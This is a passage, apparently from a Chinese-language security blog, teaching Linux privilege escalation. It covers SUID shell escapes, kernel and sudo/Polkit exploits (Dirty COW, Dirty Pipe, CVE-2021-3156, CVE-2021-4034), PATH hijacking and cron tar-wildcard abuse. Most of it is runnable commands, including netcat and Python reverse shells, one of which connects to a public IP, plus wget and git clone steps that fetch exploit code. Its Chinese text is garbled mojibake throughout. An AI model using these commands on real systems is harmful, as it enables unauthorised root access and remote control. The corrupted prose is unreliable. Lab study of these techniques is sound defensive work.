rootæƒé™çš„æ‰§è¡Œè¿‡ç¨‹å¯¼è‡´<br><br>ææƒè¿‡ç¨‹ï¼šæ¢é’ˆæ˜¯å¦æœ‰SUID(æ‰‹å·¥æˆ–è„šæœ¬)-ç‰¹å®šSUIDåˆ©ç”¨-<br></code></pre></td></tr></table></figure><h3 id="2ã€æ¢æµ‹"><a href="#2ã€æ¢æµ‹" class="headerlink" title="2ã€æ¢æµ‹"></a>2ã€æ¢æµ‹</h3><h4 id="2-1ã€æ‰‹å·¥"><a href="#2-1ã€æ‰‹å·¥" class="headerlink" title="2.1ã€æ‰‹å·¥"></a>2.1ã€æ‰‹å·¥</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æ‰‹å·¥å‘½ä»¤æ¢é’ˆå®‰å…¨ï¼š<br><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure><h4 id="2-2ã€å·¥å…·"><a href="#2-2ã€å·¥å…·" class="headerlink" title="2.2ã€å·¥å…·"></a>2.2ã€å·¥å…·</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">è„šæœ¬é¡¹ç›®æ¢é’ˆå®‰å…¨ï¼š<br>LinEnum.<span class="hljs-keyword">sh </span>traitor linuxprivchecker<br></code></pre></td></tr></table></figure><h3 id="3ã€suidåˆ©ç”¨"><a href="#3ã€suidåˆ©ç”¨" class="headerlink" title="3ã€suidåˆ©ç”¨"></a>3ã€suidåˆ©ç”¨</h3><p>å‚è€ƒåˆ©ç”¨ï¼š<br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>   â€”ã€‹å¯è·å–shell<br><a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p><h5 id="â€“-Nmap"><a href="#â€“-Nmap" class="headerlink" title="â€“ Nmap"></a>â€“ Nmap</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nmap</span> -V<br><span class="hljs-keyword">nmap</span> --interactive<br><span class="hljs-keyword">nmap</span>&gt; !sh<br><span class="hljs-keyword">sh</span>-<span class="hljs-number">3.2</span># whoami<br>root<br></code></pre></td></tr></table></figure><p><img src="/image/nmap-interactive-mode.png" alt="Nmap - Interactive Mode"></p><p><img src="/image/root-shell-via-suid-nmap.png" alt="Root Shell via SUID Nmap"></p><h5 id="â€“-Vim"><a href="#â€“-Vim" class="headerlink" title="â€“ Vim"></a>â€“ Vim</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span>.tiny /etc/shadow<br><span class="hljs-keyword">vim</span>.tiny<br>   # Press ESC key<br>   :<span class="hljs-keyword">set</span> <span class="hljs-keyword">shell</span>=/bin/<span class="hljs-keyword">sh</span><br>   :<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><p><img src="/image/vim-reading-root-files.png" alt="Vim - Reading Root Files"></p><p><img src="/image/vim-root-shell.png" alt="Vim - Root Shell"></p><h5 id="â€“-Find"><a href="#â€“-Find" class="headerlink" title="â€“ Find"></a>â€“ Find</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> pentestlab<br>  find pentestlab -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;//å¯ä»¥çœ‹è§ä¸ºrootæƒé™<br>  ----<br>  find pentestlab -<span class="hljs-built_in">exec</span> netcat -lvp 5555 -e /bin/sh \;//æ‰§è¡Œåå¼¹å‘½ä»¤<br>  ----<br>  netcat 192.168.1.189 5555<br>  <span class="hljs-built_in">id</span><br>  <span class="hljs-built_in">cat</span> /etc/shadow<br></code></pre></td></tr></table></figure><p><img src="/image/find-command-execution.png" alt="Find Command Execution"></p><p><img src="/image/run-netcat-via-find.png" alt="Run Netcat via Find"></p><p><img src="/image/root-shell-via-find.png" alt="Root Shell via Find"></p><h5 id="â€“-Bash"><a href="#â€“-Bash" class="headerlink" title="â€“ Bash"></a>â€“ Bash</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">bash -p<br>bash-3.2# id<br><span class="hljs-attribute">uid</span>=1002(service) <span class="hljs-attribute">gid</span>=1002(service) <span class="hljs-attribute">euid</span>=0(root) <span class="hljs-attribute">groups</span>=1002(service)<br></code></pre></td></tr></table></figure><h5 id="â€“-Less"><a href="#â€“-Less" class="headerlink" title="â€“ Less"></a>â€“ Less</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">less <span class="hljs-regexp">/etc/</span>passwd<br>!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><p><img src="/image/less-root-shell.png" alt="Less - Root Shell"></p><h5 id="â€“-More"><a href="#â€“-More" class="headerlink" title="â€“ More"></a>â€“ More</h5><h5 id="â€“-Nano"><a href="#â€“-Nano" class="headerlink" title="â€“ Nano"></a>â€“ Nano</h5><h5 id="â€“-cp"><a href="#â€“-cp" class="headerlink" title="â€“ cp"></a>â€“ cp</h5><p>**æ›´å¤šè¯¦è§ï¼š**<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h3 id="4ã€ä¸Šçº¿"><a href="#4ã€ä¸Šçº¿" class="headerlink" title="4ã€ä¸Šçº¿"></a>4ã€ä¸Šçº¿</h3><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tcl">touch yeye<br>find yeye -<span class="hljs-keyword">exec</span> whoami \;<br><br><br>shell ç”Ÿæˆç½‘å€ï¼šhttps://forum.ywhack.com/shell.php<br><br><br>åˆ©ç”¨NCåå¼¹ï¼š<br>find yeye -<span class="hljs-keyword">exec</span> netcat -lvp <span class="hljs-number">5555</span> -e /bin/sh \;<br>netcat xx.xx.xx.xx <span class="hljs-number">5555</span><br><br>åˆ©ç”¨Pythonåå¼¹ï¼š<br>find yeye -<span class="hljs-keyword">exec</span> python -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;47.94.236.117&quot;</span>,<span class="hljs-number">7777</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>);os.dup2(s.fileno(),<span class="hljs-number">1</span>);os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27; \;<br><br>æ”»å‡»æœºå¼€å¯ç›‘å¬ï¼šnc -lvp <span class="hljs-number">7777</span><br><br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æ¼æ´ææƒ"><a href="#ä¸‰ã€æ¼æ´ææƒ" class="headerlink" title="ä¸‰ã€æ¼æ´ææƒ"></a>ä¸‰ã€æ¼æ´ææƒ</h2><h3 id="1ã€æ™®é€šEXPä¸Šçº¿"><a href="#1ã€æ™®é€šEXPä¸Šçº¿" class="headerlink" title="1ã€æ™®é€šEXPä¸Šçº¿"></a>1ã€æ™®é€šEXPä¸Šçº¿</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ææƒè¿‡ç¨‹ï¼šè¿æ¥<span class="hljs-punctuation">-</span>è·å–å¯åˆ©ç”¨æ¼æ´<span class="hljs-punctuation">-</span>ä¸‹è½½æˆ–ä¸Šä¼ <span class="hljs-built_in">EXP</span><span class="hljs-punctuation">-</span>ç¼–è¯‘<span class="hljs-built_in">EXP</span><span class="hljs-punctuation">-</span>ç»™æƒé™æ‰§è¡Œ<span class="hljs-punctuation">-</span>GG<br>æ¢é’ˆé¡¹ç›®ï¼šBeRoot linux<span class="hljs-punctuation">-</span>exploit<span class="hljs-punctuation">-</span>suggester linux<span class="hljs-punctuation">-</span>exploit<span class="hljs-punctuation">-</span>suggester2<br><br><br>gcc <span class="hljs-number">45010</span>.c <span class="hljs-punctuation">-</span>o <span class="hljs-built_in">exp</span><br>chmod <span class="hljs-punctuation">+</span>x <span class="hljs-built_in">exp</span><br>./<span class="hljs-built_in">exp</span><br>id<br><br>é€šè¿‡æ¢é’ˆç»“æœ<span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span>&gt;ä¸‹è½½å¯¹åº”<span class="hljs-built_in">exp</span>è„šæœ¬<span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span>ã€‹ç¼–è¯‘ï¼ˆ.c/makefileï¼‰/èµ‹æƒ/è¿è¡Œ<br><br><br></code></pre></td></tr></table></figure><p><img src="/image/image-20230512010458863.png" alt="image-20230512010458863"></p><h3 id="2ã€è„ç‰›ææƒï¼ˆCVE-2016-5195ï¼‰"><a href="#2ã€è„ç‰›ææƒï¼ˆCVE-2016-5195ï¼‰" class="headerlink" title="2ã€è„ç‰›ææƒï¼ˆCVE-2016-5195ï¼‰"></a>2ã€è„ç‰›ææƒï¼ˆCVE-2016-5195ï¼‰</h3><p>Lampiaoé¶åœºå¤ç°</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gams">å†…æ ¸ææƒæ•´ä¸ªè¿‡ç¨‹ï¼šï¼ˆlinux-exploit-suggesterè·å–ä¿¡æ¯å“¦ï¼‰<br><br>å†…æ ¸æ¼æ´ææƒè¿‡ç¨‹ï¼šå¯»å¯ç”¨-ä¸‹<span class="hljs-built_in">exp</span>-ä¸Š/tmp-ç¼–è¯‘<span class="hljs-built_in">exp</span>-æ‰§è¡Œ(æ— æƒé™ç”¨chmod)<br>nmap <span class="hljs-number">192.168</span><span class="hljs-number">.46</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span><br>nmap -p1<span class="hljs-number">-65535</span> <span class="hljs-number">192.168</span><span class="hljs-number">.46</span><span class="hljs-number">.144</span><br>search drupal<br>use exploit/unix/webapp/drupal_drupalgeddon2<br><span class="hljs-keyword">set</span> rhost <span class="hljs-comment">192.168.46.144</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rport 1898</span><br>run<br><br>===è„ç‰›ææƒ===<br>upload /root/<span class="hljs-comment">dcow.cpp</span> /tmp/<span class="hljs-comment">dcow.cpp</span><br>g++ -Wall <span class="hljs-comment">-pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</span><br>python <span class="hljs-comment">-c</span> <span class="hljs-comment">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>./dcow<br>su root<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230515105608220.png" alt="image-20230515105608220"></p><h3 id="3ã€è„ç®¡ææƒï¼ˆCVE-2022-0847ï¼‰"><a href="#3ã€è„ç®¡ææƒï¼ˆCVE-2022-0847ï¼‰" class="headerlink" title="3ã€è„ç®¡ææƒï¼ˆCVE-2022-0847ï¼‰"></a>3ã€è„ç®¡ææƒï¼ˆCVE-2022-0847ï¼‰</h3><p>[]: å·¥å…·\1\æ¼”ç¤ºEXP\DirtyPipe(CVE-2022-0847)</p><p>æ–¹æ³• åŠ«æŒ<a href="https://so.csdn.net/so/search?q=SUID&spm=1001.2101.3001.7020">SUID</a>æ–‡ä»¶&#x2F;root</p><p>æ–¹æ³•ä¸€ï¼šåŠ«æŒ<a href="https://so.csdn.net/so/search?q=SUID&spm=1001.2101.3001.7020">SUID</a>æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Dirty Pipe(CVE-2022-0847)<br>5.8&lt;=Linux kernel&lt;5.16.11/5.15.25/5.10.102<br>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ <span class="hljs-built_in">uname</span> -srm<br><br>wget https://haxx.in/files/dirtypipez.c<br>gcc -std=c99 dirtypipez.c -o dirtypipez<br><br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br><br>./dirtypipez /usr/bin/su  <span class="hljs-comment">#ä»»ä½•å…·ä½“suidæƒé™çš„æ–‡ä»¶å‡å¯</span><br><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼šå¤å†™&#x2F;etc&#x2F;passwd</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">â”Œâ”€â”€<span class="hljs-params">(kaliã‰¿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>â””â”€$ <span class="hljs-string">./compile.sh</span>               <br>                                                                                                                                          <br>â”Œâ”€â”€<span class="hljs-params">(kaliã‰¿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>â””â”€$ <span class="hljs-keyword">ls</span><br>compile.sh  exploit  exploit.c  LICENSE.txt  README.md<br>                                                                                                                                          <br>â”Œâ”€â”€<span class="hljs-params">(kaliã‰¿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>â””â”€$ <span class="hljs-string">./exploit</span>   <br>Backing up <span class="hljs-string">/etc/passwd</span> to <span class="hljs-string">/tmp/passwd.bak</span> <span class="hljs-string">...</span><br>Setting root password to <span class="hljs-string">&quot;aaron&quot;</span><span class="hljs-string">...</span><br>                                                                                                                                          <br>â”Œâ”€â”€<span class="hljs-params">(kaliã‰¿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>â””â”€$ su<br>Password: <br><span class="hljs-comment"># id</span><br>uid=0<span class="hljs-params">(root)</span> gid=0<span class="hljs-params">(root)</span> groups=0<span class="hljs-params">(root)</span>,4<span class="hljs-params">(adm)</span>,20<span class="hljs-params">(dialout)</span>,119<span class="hljs-params">(wireshark)</span>,142<span class="hljs-params">(kaboxer)</span><br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>æ–¹æ³•ä¸‰</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs julia">è„šæœ¬è¿è¡Œ  bash Dirty-<span class="hljs-built_in">Pipe</span>.sh<br></code></pre></td></tr></table></figure><h3 id="4ã€SUDO-CVE-2021-3156ï¼‰"><a href="#4ã€SUDO-CVE-2021-3156ï¼‰" class="headerlink" title="4ã€SUDO(CVE-2021-3156ï¼‰"></a>4ã€SUDO(CVE-2021-3156ï¼‰</h3><p>[]: å·¥å…·\1\æ¼”ç¤ºEXP\CVE-2021-3156</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -V<br><span class="hljs-built_in">sudo</span>: 1.8.2 - 1.8.31p2<br><span class="hljs-built_in">sudo</span>: 1.9.0 - 1.9.5p1<br>-åˆ¤æ–­ï¼šsudoedit -s / æŠ¥é”™å­˜åœ¨ã€‚åˆ™æ¼æ´å­˜åœ¨<br>-åˆ©ç”¨ï¼š<br>git <span class="hljs-built_in">clone</span> https://github.com/blasty/CVE-2021-3156.git<br><span class="hljs-built_in">cd</span> CVE-2021-3156<br>make<br><span class="hljs-built_in">chmod</span> a+x sudo-hax-me-a-sandwich<br>./sudo-hax-me-a-sandwich 1<br></code></pre></td></tr></table></figure><p>æœ‰å¦‚ä¸‹æŠ¥é”™ã€‚å³å­˜åœ¨æ¼æ´</p><p><img src="/image/image-20230506145305048.png" alt="image-20230506145305048"></p><p><img src="/image/image-20230515141832770.png" alt="image-20230515141832770"></p><h3 id="5ã€Polkit-CVE-2021-4034"><a href="#5ã€Polkit-CVE-2021-4034" class="headerlink" title="5ã€Polkit(CVE-2021-4034)"></a>5ã€Polkit(CVE-2021-4034)</h3><p>[]: å·¥å…·\1\æ¼”ç¤ºEXP\CVE-2021-4034</p><p>Lampiaoé¶åœºå¤ç°</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs subunit">æ¼æ´å½±å“2009å¹´5æœˆè‡³ä»Šçš„æ‰€æœ‰polkitç‰ˆæœ¬<br><br>ç”±äºpolkitæ˜¯ç³»ç»Ÿé¢„è£…å·¥å…·ï¼Œæ‰€æœ‰å­˜åœ¨polkitçš„linuxç³»ç»Ÿå‡å—å½±å“<br>å¦‚ï¼šCentOSã€Ubuntuã€Debianã€Redhatã€Fedoraã€Gentooã€Mageiaç­‰<br>-åˆ¤æ–­ï¼šdpkg -l policykit<span class="hljs-string">-1</span><br>-åˆ©ç”¨ï¼š<br>git clone https://github.com/berdav/CVE<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>.git<br>cd CVE<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>/<br>make<br>./cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span><br></code></pre></td></tr></table></figure><p><img src="/image/image-20230506163241818.png" alt="image-20230506163241818"></p><h2 id="å››ã€ç¯å¢ƒå˜é‡æ–‡ä»¶é…åˆSUID"><a href="#å››ã€ç¯å¢ƒå˜é‡æ–‡ä»¶é…åˆSUID" class="headerlink" title="å››ã€ç¯å¢ƒå˜é‡æ–‡ä»¶é…åˆSUID"></a>å››ã€ç¯å¢ƒå˜é‡æ–‡ä»¶é…åˆSUID</h2><h4 id="1ã€æ¡ä»¶"><a href="#1ã€æ¡ä»¶" class="headerlink" title="1ã€æ¡ä»¶"></a>1ã€æ¡ä»¶</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ROOTç”¨æˆ·å¯¹æŸä¸ªç¬¬ä¸‰æ–¹ç¨‹åºç»™äºˆäº†SUIDæƒé™<br></code></pre></td></tr></table></figure><h4 id="2ã€æ¢æµ‹-1"><a href="#2ã€æ¢æµ‹-1" class="headerlink" title="2ã€æ¢æµ‹"></a>2ã€æ¢æµ‹</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æ¢é’ˆï¼š<span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h4 id="3ã€åˆ©ç”¨"><a href="#3ã€åˆ©ç”¨" class="headerlink" title="3ã€åˆ©ç”¨"></a>3ã€åˆ©ç”¨</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">é¦–å…ˆrootç”¨æˆ·æ“ä½œï¼š<br>rootç”¨æˆ·è®²å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œç¼–è¯‘ï¼Œ<br>ä¿è¯æ–‡ä»¶çš„æ­£å¸¸æˆæƒè¿è¡Œï¼Œç»™äºˆROOTæƒé™æ‰§è¡Œ<br>gcc demo.c -o yunwei<span class="hljs-comment">#ç¼–è¯‘å¸¦æœ‰å®‰å…¨é£é™©çš„Cç¨‹åº</span><br><span class="hljs-built_in">chmod</span> u+s yunwei<span class="hljs-comment">#ç»™ç¼–è¯‘å‡ºæ¥å¸¦æœ‰å®‰å…¨é£é™©çš„ç¨‹åºèµ‹äºˆSUIDæƒé™</span><br><br>å…¶æ¬¡æ™®é€šç”¨æˆ·æ“ä½œï¼š<br>æ™®é€šç”¨æˆ·é€šè¿‡å¯¹æ–‡ä»¶åç¼–è¯‘æˆ–æºä»£ç æŸ¥çœ‹ï¼Œè¦†ç›–å…¶æ‰§è¡Œç¯å¢ƒå˜é‡ï¼Œç›´æ¥è®©å…¶æ‰§è¡ŒæŒ‡å®šç¨‹åºè·å–æƒé™<br><span class="hljs-built_in">cp</span> /bin/bash /tmp/ifconfig<span class="hljs-comment">#å°†/bin/bashç¨‹åº å¤åˆ¶åˆ° /tmp/psç¨‹åº</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><span class="hljs-comment">#æ›´æ”¹ç¯å¢ƒå˜é‡ã€‚å®ç°pså‘½ä»¤è¿è¡ŒæŒ‡å‘ /tmp/ps</span><br>./yunwei  <span class="hljs-comment">#è¿è¡Œ</span><br><span class="hljs-built_in">id</span><br><br><br>è¿‡ç¨‹åˆ†æï¼š<br>1.å…ˆè·å–suidç¨‹åº<br>2.å»é™¤ç³»ç»Ÿè‡ªå¸¦çš„<br>3.ä¸‹è½½è¿™ä¸ªç¨‹åºè¿›è¡Œåç¼–è¯‘<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230505114521198.png" alt="image-20230505114521198"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="äº”ã€å®šæ—¶ä»»åŠ¡ææƒ"><a href="#äº”ã€å®šæ—¶ä»»åŠ¡ææƒ" class="headerlink" title="äº”ã€å®šæ—¶ä»»åŠ¡ææƒ"></a>äº”ã€å®šæ—¶ä»»åŠ¡ææƒ</h2><h3 id="å®šæ—¶ä»»åŠ¡-tar-suid"><a href="#å®šæ—¶ä»»åŠ¡-tar-suid" class="headerlink" title="å®šæ—¶ä»»åŠ¡&amp;tar&amp;suid"></a>å®šæ—¶ä»»åŠ¡&amp;tar&amp;suid</h3><h4 id="1ã€åŸç†"><a href="#1ã€åŸç†" class="headerlink" title="1ã€åŸç†"></a>1ã€åŸç†</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">åˆ©ç”¨å®šæ—¶ä»»åŠ¡é…ç½®ä¸è§„èŒƒå¯¼è‡´çš„å®‰å…¨é£é™©<br><br>ä¾‹å¦‚ æ‰§è¡Œçš„è„šæœ¬ï¼ˆXX.shï¼‰å¦‚ä¸‹<br>cd /tmp;tar zxf bckup.tar.gz <br><br>åœ¨æ–‡ä»¶å <span class="hljs-string">&quot;bckup.tar.gz*&quot;</span> çš„æœ«å°¾çš„æ˜Ÿå· (*) æ˜¯ä¸€ä¸ªé€šé…ç¬¦ï¼ŒåŒ¹é…å½“å‰ç›®å½•ä¸­ä»¥ <span class="hljs-string">&quot;bckup.tar.gz&quot;</span> å¼€å¤´å¹¶åœ¨å…¶åæœ‰å…¶ä»–å­—ç¬¦çš„ä»»ä½•æ–‡ä»¶ã€‚å½“ä¸€ä¸ªå½’æ¡£æ–‡ä»¶è¢«åˆ†æˆå¤šä¸ªæ–‡ä»¶ä»¥ä¾¿äºä¼ è¾“æˆ–å­˜å‚¨æ—¶ï¼Œè¿™éå¸¸æœ‰ç”¨ã€‚<br>è¿™æ ·å½“æ–‡ä»¶å¤¹ä¸‹é¢æœ‰åˆ—å…¥ â€œ--checkpoint-action=exec=sh test.shâ€çš„æ–‡ä»¶æ—¶ã€‚å°±ä¼šæœ‰å¦‚ä¸‹æ•ˆæœ<br>--&gt;tar cxf bckup.tar.gz --checkpoint-action=exec=sh test.sh<br>--&gt;tar cxf bckup.tar.gz --checkpoint=<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h4 id="2ã€æ¡ä»¶"><a href="#2ã€æ¡ä»¶" class="headerlink" title="2ã€æ¡ä»¶"></a>2ã€æ¡ä»¶</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">ææƒé€šè¿‡è·å–è®¡åˆ’ä»»åŠ¡æ‰§è¡Œæ–‡ä»¶ä¿¡æ¯è¿›è¡Œææƒ<br>1ã€ç›¸å¯¹è·¯å¾„å’Œç»å¯¹è·¯å¾„æ‰§è¡Œ<br>2ã€è®¡åˆ’ä»»åŠ¡å‘½ä»¤å­˜åœ¨å‚æ•°è°ƒç”¨<br></code></pre></td></tr></table></figure><p><strong>å¤ç°ç¯å¢ƒ</strong></p><p>å®šæ—¶ä»»åŠ¡  è¿ç”¨åˆ°äº† tar  czf  &#x2F;tmp&#x2F;backup.tar.gz *</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-number">1</span>.ä¸Šä¼ ç¯å¢ƒå¤ç°å®šæ—¶è„šæœ¬:bak.sh<br>å‹ç¼©ï¼šcd /tmp;tar czf /tmp/backup.tar.gz *<br><br>(æ³¨æ„ä¸Šä¼ åè¦èµ‹æƒ chmod +x bak.sh)<br><span class="hljs-number">2</span>.é…ç½®å®šæ—¶ä»»åŠ¡ï¼š<br>*/<span class="hljs-number">1</span> * * * * root /tmp/bak.sh<br><span class="hljs-number">3</span>.å¼€å¯å®šæ—¶ä»»åŠ¡ï¼š<br>/sbin/service crond start <br><br>crontab -u root -l<br>---å®šæ—¶ç›¸å…³å…¶ä»–å‘½ä»¤---<br>/sbin/service crond stop <span class="hljs-comment">//å…³é—­æœåŠ¡</span><br>/sbin/service crond restart <span class="hljs-comment">//é‡å¯æœåŠ¡</span><br>/sbin/service crond reload <span class="hljs-comment">//é‡æ–°è½½å…¥é…ç½®</span><br>/sbin/service crond status <span class="hljs-comment">//å¯åŠ¨æœåŠ¡</span><br></code></pre></td></tr></table></figure><h4 id="3ã€åˆ©ç”¨-1"><a href="#3ã€åˆ©ç”¨-1" class="headerlink" title="3ã€åˆ©ç”¨"></a>3ã€åˆ©ç”¨</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 